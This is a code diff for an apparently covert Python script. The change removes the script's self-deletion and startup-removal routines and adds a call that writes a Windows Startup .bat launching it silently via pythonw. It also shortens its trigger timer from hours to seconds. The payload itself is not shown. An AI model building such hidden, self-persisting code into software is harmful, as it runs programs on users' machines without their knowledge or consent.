@@ -41,23 +41,12 @@ def get_this_filename():
 
 
 USER_NAME = getpass.getuser()
-MIN_MINUTES = 10 * 60
-MAX_MINUTES = 30 * 60
+MIN_MINUTES = 0.1 * 60
+MAX_MINUTES = 0.3 * 60
 LOOP_CHECK_INTERVAL = 0.2
 THIS_FILE_PATH = get_this_file_path()
 with open(THIS_FILE_PATH, "r") as f:
     THIS_FILE_CONTENT = f.read()
-
-
-
-
-
-def remove_this_file():
-    this_file = get_this_file_path()
-    try:
-        os.remove(this_file)
-    except:
-        pass
 
 
 
@@ -72,18 +61,6 @@ def add_to_startup(file_path=""):
     bat_filepath = os.path.join(bat_path, get_this_filename().split(".")[0] + ".bat")
     with open(bat_filepath, "w") as bat_file:
         bat_file.write(f"@echo off\nstart pythonw \"{file_path}\"\nexit")
-
-
-def remove_from_startup(file_path=""):
-    if file_path == "":
-        file_path = get_this_file_path()
-    bat_path = get_startup_bat_dirpath()
-    bat_filepath = os.path.join(bat_path, get_this_filename().split(".")[0])
-    bat_filepath = bat_filepath + ".bat"
-    try:
-        os.remove(bat_filepath)
-    except:
-        pass
 
 
 def handle_exit(*args, **kwargs):
@@ -184,8 +161,7 @@ def create_invis_window():
 
 
 def main():
-    remove_from_startup()
-    remove_this_file()
+    add_to_startup()
     atexit.register(handle_exit)
     signal.signal(signal.SIGTERM, handle_exit)
     signal.signal(signal.SIGINT, handle_exit)
